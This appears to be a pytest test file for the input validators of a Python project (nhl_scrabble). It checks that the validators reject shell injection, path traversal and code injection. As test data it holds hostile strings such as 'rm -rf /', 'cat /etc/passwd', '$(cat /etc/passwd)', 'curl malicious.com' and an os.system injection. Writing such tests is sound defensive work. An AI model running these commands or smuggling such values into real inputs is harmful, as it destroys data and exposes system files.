"""Unit tests for configuration validators and injection protection."""

import tempfile
from pathlib import Path

import pytest

from nhl_scrabble.config_validators import (
    ConfigValidationError,
    validate_boolean,
    validate_enum,
    validate_positive_float,
    validate_positive_int,
    validate_safe_path,
    validate_url,
)


class TestValidatePositiveInt:
    """Test integer validation with injection protection."""

    def test_valid_integer(self) -> None:
        """Test validation of valid integer."""
        assert validate_positive_int("10", min_val=1, max_val=100) == 10

    def test_valid_integer_at_min(self) -> None:
        """Test validation at minimum boundary."""
        assert validate_positive_int("1", min_val=1, max_val=100) == 1

    def test_valid_integer_at_max(self) -> None:
        """Test validation at maximum boundary."""
        assert validate_positive_int("100", min_val=1, max_val=100) == 100

    def test_integer_with_whitespace(self) -> None:
        """Test integer with surrounding whitespace."""
        assert validate_positive_int("  42  ", min_val=1, max_val=100) == 42

    def test_rejects_command_injection_semicolon(self) -> None:
        """Test rejection of command injection with semicolon."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid integer.*contains dangerous character.*';'",
        ):
            validate_positive_int("10; rm -rf /", min_val=1, max_val=100)

    def test_rejects_command_injection_ampersand(self) -> None:
        """Test rejection of command injection with ampersand."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid integer.*contains dangerous character.*'&'",
        ):
            validate_positive_int("10 & cat /etc/passwd", min_val=1, max_val=100)

    def test_rejects_command_injection_pipe(self) -> None:
        """Test rejection of command injection with pipe."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid integer.*contains dangerous character.*'\|'",
        ):
            validate_positive_int("10 | whoami", min_val=1, max_val=100)

    def test_rejects_command_injection_backtick(self) -> None:
        """Test rejection of command injection with backtick."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid integer.*contains dangerous character.*'`'",
        ):
            validate_positive_int("10`whoami`", min_val=1, max_val=100)

    def test_rejects_command_injection_dollar(self) -> None:
        """Test rejection of command injection with dollar sign."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid integer.*contains dangerous character.*'\$'",
        ):
            validate_positive_int("10$((1+1))", min_val=1, max_val=100)

    def test_rejects_newline(self) -> None:
        """Test rejection of newline character."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid integer.*contains dangerous character",
        ):
            validate_positive_int("10\nrm -rf /", min_val=1, max_val=100)

    def test_rejects_non_integer(self) -> None:
        """Test rejection of non-integer value."""
        with pytest.raises(ConfigValidationError, match=r"Invalid integer: 'not_a_number'"):
            validate_positive_int("not_a_number", min_val=1, max_val=100)

    def test_rejects_float(self) -> None:
        """Test rejection of float value."""
        with pytest.raises(ConfigValidationError, match=r"Invalid integer: '10.5'"):
            validate_positive_int("10.5", min_val=1, max_val=100)

    def test_rejects_below_minimum(self) -> None:
        """Test rejection of value below minimum."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Value 0 outside allowed range \[1, 100\]",
        ):
            validate_positive_int("0", min_val=1, max_val=100)

    def test_rejects_above_maximum(self) -> None:
        """Test rejection of value above maximum."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Value 101 outside allowed range \[1, 100\]",
        ):
            validate_positive_int("101", min_val=1, max_val=100)


class TestValidatePositiveFloat:
    """Test float validation with injection protection."""

    def test_valid_float(self) -> None:
        """Test validation of valid float."""
        assert validate_positive_float("0.5", min_val=0.0, max_val=10.0) == 0.5

    def test_valid_integer_as_float(self) -> None:
        """Test validation of integer as float."""
        assert validate_positive_float("5", min_val=0.0, max_val=10.0) == 5.0

    def test_valid_float_at_min(self) -> None:
        """Test validation at minimum boundary."""
        assert validate_positive_float("0.0", min_val=0.0, max_val=10.0) == 0.0

    def test_valid_float_at_max(self) -> None:
        """Test validation at maximum boundary."""
        assert validate_positive_float("10.0", min_val=0.0, max_val=10.0) == 10.0

    def test_float_with_whitespace(self) -> None:
        """Test float with surrounding whitespace."""
        assert validate_positive_float("  3.14  ", min_val=0.0, max_val=10.0) == 3.14

    def test_rejects_command_injection_semicolon(self) -> None:
        """Test rejection of command injection with semicolon."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid float.*contains dangerous character.*';'",
        ):
            validate_positive_float("1.5; cat /etc/passwd", min_val=0.0, max_val=10.0)

    def test_rejects_command_injection_pipe(self) -> None:
        """Test rejection of command injection with pipe."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid float.*contains dangerous character.*'\|'",
        ):
            validate_positive_float("2.0 | ls", min_val=0.0, max_val=10.0)

    def test_rejects_non_float(self) -> None:
        """Test rejection of non-float value."""
        with pytest.raises(ConfigValidationError, match=r"Invalid float: 'not_a_float'"):
            validate_positive_float("not_a_float", min_val=0.0, max_val=10.0)

    def test_rejects_below_minimum(self) -> None:
        """Test rejection of value below minimum."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Value -1\.0 outside allowed range \[0\.0, 10\.0\]",
        ):
            validate_positive_float("-1.0", min_val=0.0, max_val=10.0)

    def test_rejects_above_maximum(self) -> None:
        """Test rejection of value above maximum."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Value 11\.0 outside allowed range \[0\.0, 10\.0\]",
        ):
            validate_positive_float("11.0", min_val=0.0, max_val=10.0)


class TestValidateSafePath:
    """Test path validation with traversal and injection protection."""

    def test_valid_relative_path(self) -> None:
        """Test validation of valid relative path."""
        with tempfile.TemporaryDirectory() as tmpdir:
            original_cwd = Path.cwd()
            try:
                import os

                os.chdir(tmpdir)
                result = validate_safe_path("output/report.json")
                assert result.name == "report.json"
                assert result.parent.name == "output"
            finally:
                os.chdir(original_cwd)

    def test_valid_simple_filename(self) -> None:
        """Test validation of simple filename."""
        with tempfile.TemporaryDirectory() as tmpdir:
            original_cwd = Path.cwd()
            try:
                import os

                os.chdir(tmpdir)
                result = validate_safe_path("report.json")
                assert result.name == "report.json"
            finally:
                os.chdir(original_cwd)

    def test_rejects_path_traversal_parent(self) -> None:
        """Test rejection of path traversal with parent directory."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Path outside working directory",
        ):
            validate_safe_path("../../etc/passwd")

    def test_rejects_path_traversal_absolute(self) -> None:
        """Test rejection of absolute path traversal."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Absolute paths not allowed",
        ):
            validate_safe_path("/etc/passwd")

    def test_allows_absolute_path_when_enabled(self) -> None:
        """Test absolute paths allowed when allow_absolute=True."""
        with tempfile.TemporaryDirectory() as tmpdir:
            original_cwd = Path.cwd()
            try:
                import os

                os.chdir(tmpdir)
                test_path = Path(tmpdir) / "test.txt"
                result = validate_safe_path(str(test_path), allow_absolute=True)
                assert result.is_absolute()
            finally:
                os.chdir(original_cwd)

    def test_rejects_command_injection_semicolon(self) -> None:
        """Test rejection of command injection with semicolon."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Unsafe characters in path.*contains: ';'",
        ):
            validate_safe_path("report.json; rm -rf /")

    def test_rejects_command_injection_pipe(self) -> None:
        """Test rejection of command injection with pipe."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Unsafe characters in path.*contains: '\|'",
        ):
            validate_safe_path("report.json | cat")

    def test_rejects_command_injection_ampersand(self) -> None:
        """Test rejection of command injection with ampersand."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Unsafe characters in path.*contains: '&'",
        ):
            validate_safe_path("report.json & whoami")

    def test_rejects_command_injection_backtick(self) -> None:
        """Test rejection of command injection with backtick."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Unsafe characters in path.*contains: '`'",
        ):
            validate_safe_path("report`whoami`.json")

    def test_must_exist_validation(self) -> None:
        """Test must_exist validation."""
        import os

        with tempfile.TemporaryDirectory() as tmpdir:
            original_cwd = Path.cwd()
            try:
                os.chdir(tmpdir)

                # Create a test file
                test_file = Path("test.json")
                test_file.write_text("{}")

                # Should succeed - file exists
                result = validate_safe_path("test.json", must_exist=True)
                assert result.exists()

                # Should fail - file doesn't exist
                with pytest.raises(ConfigValidationError, match=r"Path does not exist"):
                    validate_safe_path("nonexistent.json", must_exist=True)
            finally:
                os.chdir(original_cwd)


class TestValidateEnum:
    """Test enum validation with injection protection."""

    def test_valid_enum_value(self) -> None:
        """Test validation of valid enum value."""
        result = validate_enum("json", {"text", "json", "html"})
        assert result == "json"

    def test_case_insensitive_enum(self) -> None:
        """Test case-insensitive enum validation."""
        result = validate_enum("JSON", {"text", "json", "html"})
        assert result == "json"

    def test_enum_with_whitespace(self) -> None:
        """Test enum value with whitespace."""
        result = validate_enum("  text  ", {"text", "json", "html"})
        assert result == "text"

    def test_rejects_invalid_enum_value(self) -> None:
        """Test rejection of invalid enum value."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid value 'xml'\. Allowed values: html, json, text",
        ):
            validate_enum("xml", {"text", "json", "html"})

    def test_rejects_command_injection_semicolon(self) -> None:
        """Test rejection of command injection with semicolon."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid value.*contains dangerous character.*';'",
        ):
            validate_enum("text; rm -rf /", {"text", "json", "html"})

    def test_rejects_command_injection_pipe(self) -> None:
        """Test rejection of command injection with pipe."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid value.*contains dangerous character.*'\|'",
        ):
            validate_enum("json | cat", {"text", "json", "html"})


class TestValidateBoolean:
    """Test boolean validation with injection protection."""

    def test_true_lowercase(self) -> None:
        """Test 'true' string."""
        assert validate_boolean("true") is True

    def test_true_uppercase(self) -> None:
        """Test 'TRUE' string."""
        assert validate_boolean("TRUE") is True

    def test_true_mixed_case(self) -> None:
        """Test 'True' string."""
        assert validate_boolean("True") is True

    def test_one_as_true(self) -> None:
        """Test '1' as true."""
        assert validate_boolean("1") is True

    def test_yes_as_true(self) -> None:
        """Test 'yes' as true."""
        assert validate_boolean("yes") is True

    def test_on_as_true(self) -> None:
        """Test 'on' as true."""
        assert validate_boolean("on") is True

    def test_false_lowercase(self) -> None:
        """Test 'false' string."""
        assert validate_boolean("false") is False

    def test_false_uppercase(self) -> None:
        """Test 'FALSE' string."""
        assert validate_boolean("FALSE") is False

    def test_zero_as_false(self) -> None:
        """Test '0' as false."""
        assert validate_boolean("0") is False

    def test_no_as_false(self) -> None:
        """Test 'no' as false."""
        assert validate_boolean("no") is False

    def test_off_as_false(self) -> None:
        """Test 'off' as false."""
        assert validate_boolean("off") is False

    def test_boolean_with_whitespace(self) -> None:
        """Test boolean with whitespace."""
        assert validate_boolean("  true  ") is True

    def test_rejects_invalid_boolean(self) -> None:
        """Test rejection of invalid boolean value."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid boolean: 'maybe'\. Allowed: true, false",
        ):
            validate_boolean("maybe")

    def test_rejects_command_injection(self) -> None:
        """Test rejection of command injection."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid boolean.*contains dangerous character",
        ):
            validate_boolean("true; rm -rf /")


class TestValidateUrl:
    """Test URL validation with security checks."""

    def test_valid_https_url(self) -> None:
        """Test valid HTTPS URL."""
        result = validate_url("https://api.example.com")
        assert result == "https://api.example.com"

    def test_valid_https_url_with_path(self) -> None:
        """Test valid HTTPS URL with path."""
        result = validate_url("https://api.example.com/v1/data")
        assert result == "https://api.example.com/v1/data"

    def test_valid_https_url_with_port(self) -> None:
        """Test valid HTTPS URL with port."""
        result = validate_url("https://api.example.com:8443/v1")
        assert result == "https://api.example.com:8443/v1"

    def test_valid_http_url_when_allowed(self) -> None:
        """Test HTTP URL when require_https=False."""
        result = validate_url("http://api.example.com", require_https=False)
        assert result == "http://api.example.com"

    def test_rejects_http_when_https_required(self) -> None:
        """Test rejection of HTTP when HTTPS required."""
        with pytest.raises(
            ConfigValidationError,
            match=r"URL must use HTTPS protocol.*HTTP is insecure",
        ):
            validate_url("http://api.example.com")

    def test_rejects_command_injection_semicolon(self) -> None:
        """Test rejection of command injection with semicolon."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid URL.*contains dangerous character.*';'",
        ):
            validate_url("https://api.example.com; rm -rf /")

    def test_rejects_command_injection_pipe(self) -> None:
        """Test rejection of command injection with pipe."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid URL.*contains dangerous character.*'\|'",
        ):
            validate_url("https://api.example.com | cat")

    def test_rejects_invalid_url_format(self) -> None:
        """Test rejection of invalid URL format."""
        with pytest.raises(
            ConfigValidationError,
            match=r"Invalid URL format",
        ):
            validate_url("not-a-url")

    def test_url_with_whitespace(self) -> None:
        """Test URL with surrounding whitespace."""
        result = validate_url("  https://api.example.com  ")
        assert result == "https://api.example.com"


class TestInjectionScenarios:
    """Test comprehensive injection attack scenarios."""

    def test_prevents_shell_command_in_timeout(self) -> None:
        """Test prevention of shell command injection in timeout config."""
        with pytest.raises(ConfigValidationError):
            validate_positive_int("10; curl malicious.com", min_val=1, max_val=100)

    def test_prevents_path_traversal_in_output_file(self) -> None:
        """Test prevention of path traversal in output file config."""
        with pytest.raises(ConfigValidationError, match=r"Path outside working directory"):
            validate_safe_path("../../../etc/passwd")

    def test_prevents_code_injection_in_format(self) -> None:
        """Test prevention of code injection in format config."""
        with pytest.raises(ConfigValidationError):
            validate_enum("json'); import os; os.system('rm -rf /", {"text", "json", "html"})

    def test_prevents_backtick_command_substitution(self) -> None:
        """Test prevention of backtick command substitution."""
        with pytest.raises(ConfigValidationError):
            validate_positive_int("`whoami`", min_val=1, max_val=100)

    def test_prevents_dollar_command_substitution(self) -> None:
        """Test prevention of dollar command substitution."""
        with pytest.raises(ConfigValidationError):
            validate_positive_float("$(cat /etc/passwd)", min_val=0.0, max_val=10.0)

    def test_prevents_newline_injection(self) -> None:
        """Test prevention of newline injection."""
        with pytest.raises(ConfigValidationError):
            validate_enum("text\nmalicious_command", {"text", "json", "html"})

    def test_prevents_null_byte_in_path(self) -> None:
        """Test prevention of null byte in path."""
        # Null bytes would be caught by Path() validation
        # This is more of a defensive test
        # Path() handles this internally
